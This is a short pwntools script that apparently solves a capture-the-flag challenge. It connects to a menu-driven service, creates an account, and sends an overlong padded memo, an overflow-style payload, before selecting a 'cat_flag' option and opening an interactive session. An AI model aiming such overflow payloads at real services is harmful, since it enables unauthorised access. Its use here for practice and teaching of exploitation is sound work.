#!/usr/bin/python3
#coding: utf-8

from pwn import *
from time import sleep
import sys

host = str(sys.argv[1])
port = int(sys.argv[2])

arch = 'i386'

context.log_level = 'critical'

create_account = '1'
first_name = 'test'
last_name = 'test'
delete_account = '3'
memo = '4'
add_memo = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPfuck'
cat_flag = '5'

p = remote(host, port)
p.recvline("Please enter an operation number:")
sleep(0.5)
p.sendline(create_account)
sleep(0.5)
p.recvline("First name:")
p.sendline(first_name)
sleep(0.5)
p.recvline("Last name:")
p.sendline(last_name)
sleep(0.5)
p.recvline("Please enter an operation number:")
p.sendline(memo)
sleep(0.5)
p.recvline("Please enter memo:")
p.sendline(add_memo)
p.recvline("Thank you, please keep this reference number number safe:")
sleep(0.5)
p.recvline("Please enter an operation number:")
p.sendline(cat_flag)

p.interactive()
